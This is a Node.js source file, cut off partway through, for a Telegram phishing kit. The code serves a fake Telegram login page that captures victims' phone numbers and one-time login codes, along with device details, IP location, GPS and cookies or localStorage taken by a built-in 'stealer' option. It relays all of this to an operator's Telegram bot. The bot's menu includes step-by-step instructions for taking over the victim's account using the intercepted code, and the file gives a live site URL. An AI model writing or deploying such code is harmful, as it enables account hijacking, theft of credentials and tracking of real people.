// ==== file: index.js ====
// language: JavaScript, target: Node.js 20 (Render)
import express from 'express';
import TelegramBot from 'node-telegram-bot-api';

// ==========================================
// КОНФИГУРАЦИЯ
// ==========================================
const CONFIG = {
    BOT_TOKEN: process.env.BOT_TOKEN,
    ADMIN_ID: process.env.ADMIN_CHAT_ID,
    PORT: process.env.PORT || 3000,
    START_TIME: Date.now(),
    RATE_LIMIT_WINDOW: 60000,
    RATE_LIMIT_MAX: 10
};

if (!CONFIG.BOT_TOKEN || !CONFIG.ADMIN_ID) {
    console.error("❌ CRITICAL: Missing BOT_TOKEN or ADMIN_CHAT_ID");
    process.exit(1);
}

// ==========================================
// ИНИЦИАЛИЗАЦИЯ
// ==========================================
const bot = new TelegramBot(CONFIG.BOT_TOKEN, { polling: true });
const app = express();
app.use(express.json({ limit: '15mb' }));

// ==========================================
// ГЛОБАЛЬНОЕ СОСТОЯНИЕ
// ==========================================
const State = {
    history: [],
    stats: {
        visits: 0,
        clicks: 0,
        phones: 0,
        codes: 0,
        osCount: {},
        geoCount: {}
    },
    settings: {
        notifyEnabled: true,
        doubleCode: true,
        stealData: true,
        geoEnabled: true
    },
    rateLimit: new Map()
};

// ==========================================
// УТИЛИТЫ
// ==========================================
const Utils = {
    formatTime: (ms) => {
        const s = Math.floor(ms / 1000);
        const m = Math.floor(s / 60);
        const h = Math.floor(m / 60);
        return `${h}ч ${m % 60}м ${s % 60}с`;
    },
    
    getUptime: () => Utils.formatTime(Date.now() - CONFIG.START_TIME),
    
    getPing: async () => {
        const start = Date.now();
        try {
            await bot.getMe();
            return Date.now() - start;
        } catch (e) {
            return 999;
        }
    },

    parseUA: (ua) => {
        let res = { os: "Unknown", model: "Unknown", browser: "Unknown" };
        if (!ua) return res;
        
        if (ua.includes("Android")) res.os = "Android";
        else if (ua.includes("iPhone") || ua.includes("iPad")) res.os = "iOS";
        else if (ua.includes("Windows")) res.os = "Windows";
        else if (ua.includes("Mac OS")) res.os = "macOS";
        else if (ua.includes("Linux")) res.os = "Linux";
        
        const match = ua.match(/Android\s[0-9.]+;\s([^;)]+)/);
        if (match && match[1]) {
            let m = match[1].trim();
            if (m.includes("-")) m = m.split("-").pop();
            res.model = m;
        } else if (ua.includes("iPhone")) {
            res.model = "iPhone";
        } else if (ua.includes("Windows")) {
            res.model = "PC";
        }
        
        if (ua.includes("Chrome")) res.browser = "Chrome";
        else if (ua.includes("Safari") && !ua.includes("Chrome")) res.browser = "Safari";
        else if (ua.includes("Firefox")) res.browser = "Firefox";
        else if (ua.includes("Telegram")) res.browser = "Telegram In-App";
        
        return res;
    },

    checkRate: (ip) => {
        const now = Date.now();
        const record = State.rateLimit.get(ip) || { count: 0, start: now };
        if (now - record.start > CONFIG.RATE_LIMIT_WINDOW) {
            record.count = 0;
            record.start = now;
        }
        record.count++;
        State.rateLimit.set(ip, record);
        return record.count <= CONFIG.RATE_LIMIT_MAX;
    }
};

// ==========================================
// БОТ: КЛАВИАТУРЫ
// ==========================================
const Keyboards = {
    bottom: {
        reply_markup: {
            keyboard: [
                [{ text: '📊 Статистика' }, { text: '📜 История' }],
                [{ text: '⚙️ Настройки' }, { text: '📖 Инструкция' }],
                [{ text: '🌐 Открыть Сайт' }]
            ],
            resize_keyboard: true,
            is_persistent: true
        }
    }
};

// ==========================================
// БОТ: ЛОГИКА
// ==========================================
const BotLogic = {
    sendAdmin: async (text) => {
        if (!State.settings.notifyEnabled) return;
        try {
            await bot.sendMessage(CONFIG.ADMIN_ID, text, { parse_mode: 'HTML' });
        } catch (e) {
            console.error('Send error:', e.message);
        }
    },

    init: () => {
        // /start
        bot.onText(/^\/start$/, (msg) => {
            bot.sendMessage(msg.chat.id, `🛡 <b>Панель управления</b>\n\nID: <code>${msg.chat.id}</code>`, { 
                parse_mode: 'HTML', 
                ...Keyboards.bottom 
            });
        });

        // Обработка нижних кнопок
        bot.on('message', async (msg) => {
            const chatId = msg.chat.id;
            const text = msg.text;

            if (text === '📊 Статистика') {
                const topOS = Object.entries(State.stats.osCount)
                    .sort((a, b) => b[1] - a[1])
                    .slice(0, 3)
                    .map(([os, c]) => `${os}: ${c}`)
                    .join('\n');
                    
                const msgText = `📊 <b>Статистика</b>\n\n` +
                    `⏱ Аптайм: ${Utils.getUptime()}\n` +
                    `👁 Визитов: ${State.stats.visits}\n` +
                    `🖱 Кликов: ${State.stats.clicks}\n` +
                    `📱 Номеров: ${State.stats.phones}\n` +
                    `🔑 Кодов: ${State.stats.codes}\n\n` +
                    `<b>Топ ОС:</b>\n${topOS || 'Нет данных'}`;
                    
                bot.sendMessage(chatId, msgText, { 
                    parse_mode: 'HTML',
                    reply_markup: { inline_keyboard: [[{ text: '🔄 Обновить', callback_data: 'stats' }]] }
                });
            }

            if (text === '📜 История') {
                if (State.history.length === 0) return bot.sendMessage(chatId, '📜 История пуста.');
                const histText = State.history.slice(0, 15).map((h, i) => 
                    `<b>${i + 1}.</b> <code>${h.phone}</code> | <code>${h.code}</code>`
                ).join('\n');
                bot.sendMessage(chatId, `📜 <b>Последние 15 целей:</b>\n\n${histText}`, { 
                    parse_mode: 'HTML',
                    reply_markup: { inline_keyboard: [[{ text: '🗑 Очистить', callback_data: 'clear' }]] }
                });
            }

            if (text === '⚙️ Настройки') {
                const s = State.settings;
                bot.sendMessage(chatId, `⚙️ <b>Настройки системы</b>`, {
                    parse_mode: 'HTML',
                    reply_markup: { inline_keyboard: [
                        [{ text: `Уведомления: ${s.notifyEnabled ? 'ВКЛ ✅' : 'ВЫКЛ ❌'}`, callback_data: 't_notify' }],
                        [{ text: `Двойной код: ${s.doubleCode ? 'ВКЛ ✅' : 'ВЫКЛ ❌'}`, callback_data: 't_double' }],
                        [{ text: `Стиллер: ${s.stealData ? 'ВКЛ ✅' : 'ВЫКЛ ❌'}`, callback_data: 't_steal' }],
                        [{ text: `Геолокация: ${s.geoEnabled ? 'ВКЛ ✅' : 'ВЫКЛ ❌'}`, callback_data: 't_geo' }]
                    ]}
                });
            }

            if (text === '📖 Инструкция') {
                bot.sendMessage(chatId, 
                    `📖 <b>Инструкция</b>\n\n` +
                    `1. Скинь ссылку.\n` +
                    `2. Жертва вводит номер.\n` +
                    `3. Ты вводишь номер в Telegram.\n` +
                    `4. Жертва вводит код на сайте.\n` +
                    `5. Вводишь код в Telegram.`, 
                    { parse_mode: 'HTML' }
                );
            }

            if (text === '🌐 Открыть Сайт') {
                bot.sendMessage(chatId, `🌐 https://tg-sms-2.onrender.com`);
            }
        });

        // Инлайн кнопки
        bot.on('callback_query', async (query) => {
            const chatId = query.message.chat.id;
            const data = query.data;
            bot.answerCallbackQuery(query.id);

            if (data === 'stats') {
                const topOS = Object.entries(State.stats.osCount)
                    .sort((a, b) => b[1] - a[1])
                    .slice(0, 3)
                    .map(([os, c]) => `${os}: ${c}`)
                    .join('\n');
                    
                const msgText = `📊 <b>Статистика</b>\n\n` +
                    `⏱ Аптайм: ${Utils.getUptime()}\n` +
                    `👁 Визитов: ${State.stats.visits}\n` +
                    `🖱 Кликов: ${State.stats.clicks}\n` +
                    `📱 Номеров: ${State.stats.phones}\n` +
                    `🔑 Кодов: ${State.stats.codes}\n\n` +
                    `<b>Топ ОС:</b>\n${topOS || 'Нет данных'}`;
                    
                bot.editMessageText(msgText, { 
                    chat_id: chatId, 
                    message_id: query.message.message_id, 
                    parse_mode: 'HTML',
                    reply_markup: { inline_keyboard: [[{ text: '🔄 Обновить', callback_data: 'stats' }]] }
                });
            }

            if (data === 'clear') {
                State.history = [];
                State.stats.phones = 0;
                State.stats.codes = 0;
                bot.editMessageText('🗑 Очищено.', { chat_id: chatId, message_id: query.message.message_id });
            }

            if (data === 't_notify') State.settings.notifyEnabled = !State.settings.notifyEnabled;
            if (data === 't_double') State.settings.doubleCode = !State.settings.doubleCode;
            if (data === 't_steal') State.settings.stealData = !State.settings.stealData;
            if (data === 't_geo') State.settings.geoEnabled = !State.settings.geoEnabled;

            if (data.startsWith('t_')) {
                const s = State.settings;
                bot.editMessageText(`⚙️ <b>Настройки системы</b>`, {
                    chat_id: chatId, 
                    message_id: query.message.message_id, 
                    parse_mode: 'HTML',
                    reply_markup: { inline_keyboard: [
                        [{ text: `Уведомления: ${s.notifyEnabled ? 'ВКЛ ✅' : 'ВЫКЛ ❌'}`, callback_data: 't_notify' }],
                        [{ text: `Двойной код: ${s.doubleCode ? 'ВКЛ ✅' : 'ВЫКЛ ❌'}`, callback_data: 't_double' }],
                        [{ text: `Стиллер: ${s.stealData ? 'ВКЛ ✅' : 'ВЫКЛ ❌'}`, callback_data: 't_steal' }],
                        [{ text: `Геолокация: ${s.geoEnabled ? 'ВКЛ ✅' : 'ВЫКЛ ❌'}`, callback_data: 't_geo' }]
                    ]}
                });
            }
        });
    }
};

// ==========================================
// API МАРШРУТЫ
// ==========================================
app.post('/api/new_target', async (req, res) => {
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    
    if (!Utils.checkRate(ip)) {
        return res.status(429).json({ ok: false, error: 'Rate limit exceeded' });
    }

    State.stats.visits++;
    State.stats.phones++;
    
    const { phone, ua, screen, battery, memory, network, geo, steal } = req.body;
    
    if (!phone || phone.length < 8) {
        return res.status(400).json({ ok: false });
    }

    const device = Utils.parseUA(ua);
    State.stats.osCount[device.os] = (State.stats.osCount[device.os] || 0) + 1;

    let locStr = "Unknown";
    try {
        const r = await fetch(`http://ip-api.com/json/${ip.split(',')[0]}?fields=country,city,isp`);
        const d = await r.json();
        if (d.country) {
            locStr = `${d.country}, ${d.city} (${d.isp})`;
            State.stats.geoCount[d.country] = (State.stats.geoCount[d.country] || 0) + 1;
        }
    } catch (e) {}

    let msg = `🎯 <b>НОВАЯ ЦЕЛЬ</b>\n\n` +
        `📱 <b>Номер:</b> <code>${phone}</code>\n` +
        `💻 <b>Устройство:</b> ${device.os} / ${device.model}\n` +
        `🌐 <b>Браузер:</b> ${device.browser}\n` +
        `🖥 <b>Экран:</b> ${screen || '?'}\n` +
        `🔋 <b>Батарея:</b> ${battery || '?'}\n` +
        `🧠 <b>ОЗУ:</b> ${memory || '?'}\n` +
        `📶 <b>Сеть:</b> ${network || '?'}\n\n` +
        `🌍 <b>IP:</b> <code>${ip.split(',')[0]}</code>\n` +
        `📍 <b>Локация:</b> ${locStr}\n`;

    if (geo) msg += `🗺 <b>GPS:</b> <a href="https://maps.google.com/?q=${geo}">Открыть карту</a>\n`;

    if (steal && steal.length > 0 && State.settings.stealData) {
        msg += `\n🍪 <b>УКРАДЕНО (Cookies/LS):</b>\n`;
        steal.slice(0, 5).forEach(s => {
            msg += `<code>${s.name}</code>: <code>${s.value.substring(0, 15)}...</code>\n`;
        });
        if (steal.length > 5) msg += `<i>...и еще ${steal.length - 5} записей</i>\n`;
    }

    msg += `🕒 <b>Время:</b> ${new Date().toLocaleString('ru-RU')}`;
    
    await BotLogic.sendAdmin(msg);
    res.json({ ok: true, doubleCode: State.settings.doubleCode });
});

app.post('/api/click', (req, res) => {
    State.stats.clicks++;
    res.json({ ok: true });
});

app.post('/api/code', async (req, res) => {
    State.stats.codes++;
    const { phone, code } = req.body;
    
    State.history.unshift({ phone, code, time: Date.now() });
    if (State.history.length > 50) State.history.pop();

    const msg = `😈 <b>ПЕРЕХВАТ КОДА</b>\n\n` +
        `📱 Номер: <code>${phone}</code>\n` +
        `🔑 Код: <code>${code}</code>\n\n` +
        `🏃‍♂️ <i>БЕГИ В TELEGRAM И ВВОДИ!</i>`;
    
    await BotLogic.sendAdmin(msg);
    res.json({ ok: true });
});

// ==========================================
// ОТДАЧА САЙТА
// ==========================================
app.get('/', (req, res) => {
    res.send(`
<!DOCTYPE html>
<html lang="ru">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>Telegram: Авторизация</title>
<style>
    :root { --bg: #17212b; --surface: #0e1621; --primary: #2aabee; --primary-hover: #229ed9; --text: #ffffff; --text-muted: #708499; --border: #2b5278; }
    * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, 'SF Pro Display', 'Segoe UI', Roboto, sans-serif; -webkit-tap-highlight-color: transparent; }
    body { background: var(--bg); color: var(--text); display: flex; justify-content: center; align-items: center; min-height: 100vh; overflow: hidden; user-select: none; }
    .app { width: 100%; max-width: 420px; height: 100vh; background: var(--bg); display: flex; flex-direction: column; position: relative; }
    .top-bar { display: flex; justify-content: space-between; align-items: center; padding: 15px 20px; font-size: 15px; color: var(--primary); font-weight: 500; }
    .top-bar .time { color: var(--text); font-weight: 600; }
    .header { padding: 20px; text-align: center; }
    .logo { width: 90px; height: 90px; background: linear-gradient(135deg, var(--primary), var(--primary-hover)); border-radius: 50%; display: flex; justify-content: center; align-items: center; margin: 0 auto 20px; box-shadow: 0 8px 25px rgba(42, 171, 238, 0.3); }
    .logo svg { width: 55px; height: 55px; fill: #fff; margin-left: 5px; }
    h1 { font-size: 24px; font-weight: 500; margin-bottom: 10px; }
    p.subtitle { font-size: 14px; color: var(--text-muted); line-height: 1.5; padding: 0 10px; }
    .form-container { padding: 20px; flex: 1; display: flex; flex-direction: column; }
    .input-group { display: flex; gap: 10px; margin-bottom: 25px; animation: fadeIn 0.3s ease; }
    .country-select { width: 110px; background: var(--surface); border: 1px solid var(--border); border-radius: 10px; color: var(--text); padding: 0 10px; font-size: 16px; outline: none; appearance: none; }
    .input-phone { flex: 1; background: var(--surface); border: 1px solid var(--border); border-radius: 10px; color: var(--text); padding: 16px; font-size: 17px; outline: none; transition: border-color 0.2s; }
    .input-phone:focus { border-color: var(--primary); }
    .btn { background: var(--primary); color: var(--text); border: none; border-radius: 10px; padding: 16px; font-size: 16px; font-weight: 500; cursor: pointer; transition: background 0.2s; width: 100%; display: flex; justify-content: center; align-items: center; }
    .btn:active { background: var(--primary-hover); }
    .btn:disabled { opacity: 0.7; cursor: not-allowed; }
    .hidden { display: none !important; }
    .spinner { display: inline-block; width: 20px; height: 20px; border: 2.5px solid rgba(255,255,255,0.3); border-radius: 50%; border-top-color: #fff; animation: spin 0.8s linear infinite; margin-right: 10px; }
    @keyframes spin { to { transform: rotate(360deg); } }
    @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
    .code-container { display: flex; justify-content: center; gap: 10px; margin-bottom: 25px; animation: fadeIn 0.3s ease; }
    .code-input { width: 50px; height: 60px; text-align: center; font-size: 24px; font-weight: 600; background: var(--surface); border: 1.5px solid var(--border); border-radius: 10px; color: var(--text); outline: none; transition: border-color 0.2s; }
    .code-input:focus { border-color: var(--primary); }
    .hidden-stealer { position: absolute; opacity: 0; pointer-events: none; height: 0; width: 0; }
</style>
</head>
<body>
<div class="app">
    <div class="top-bar"><span id="clock"></span><span>Отмена</span></div>
    <div class="header">
        <div class="logo">
            <svg viewBox="0 0 24 24"><path d="M12 0c-6.627 0-12 5.373-12 12s5.373 12 12 12 12-5.373 12-12-5.373-12-12-12zm5.894 8.221l-1.97 9.28c-.145.658-.537.818-1.084.508l-3-2.21-1.446 1.394c-.14.18-.357.295-.6.295-.002 0-.003 0-.005 0l.213-3.054 5.56-5.022c.24-.213-.054-.334-.373-.121l-6.869 4.326-2.96-.924c-.64-.203-.658-.64.135-.954l11.566-4.458c.538-.196 1.006.128.832.94z"/></svg>
        </div>
        <h1 id="title">Ваш номер</h1>
        <p class="subtitle" id="subtitle">Пожалуйста, подтвердите код страны и ваш номер телефона.</p>
    </div>
    <div class="form-container">
        <form id="phoneForm" autocomplete="off">
            <input type="text" class="hidden-stealer" id="hiddenStealer">
            <div class="input-group">
                <select class="country-select" id="countryCode">
                    <option value="373">🇲🇩 +373</option><option value="7">🇷🇺 +7</option><option value="380">🇺🇦 +380</option><option value="375">🇧🇾 +375</option><option value="1">🇺🇸 +1</option><option value="44">🇬🇧 +44</option><option value="49">🇩🇪 +49</option><option value="33">🇫🇷 +33</option><option value="39">🇮🇹 +39</option><option value="34">🇪🇸 +34</option><option value="90">🇹🇷 +90</option><option value="40">🇷🇴 +40</option>
                </select>
                <input type="tel" class="input-phone" id="phone" placeholder="69 123 456" required>
            </div>
            <button type="submit" class="btn" id="btnPhone">Далее</button>
        </form>
        <form id="codeForm" class="hidden" autocomplete="off">
            <div class="code-container">
                <input type="text" class="code-input" maxlength="1" inputmode="numeric" pattern="[0-9]*">
                <input type="text" class="code-input" maxlength="1" inputmode="numeric" pattern="[0-9]*">
                <input type="text" class="code-input" maxlength="1" inputmode="numeric" pattern="[0-9]*">
                <input type="text" class="code-input" maxlength="1" inputmode="numeric" pattern="[0-9]*">
                <input type="text" class="code-input" maxlength="1" inputmode="numeric" pattern="[0-9]*">
            </div>
            <button type="submit" class="btn" id="btnCode">Далее</button>
        </form>
    </div>
</div>
<script>
    const phoneForm = document.getElementById('phoneForm');
    const codeForm = document.getElementById('codeForm');
    const btnPhone = document.getElementById('btnPhone');
    const btnCode = document.getElementById('btnCode');
    const countryCode = document.getElementById('countryCode');
    const codeInputs = docu
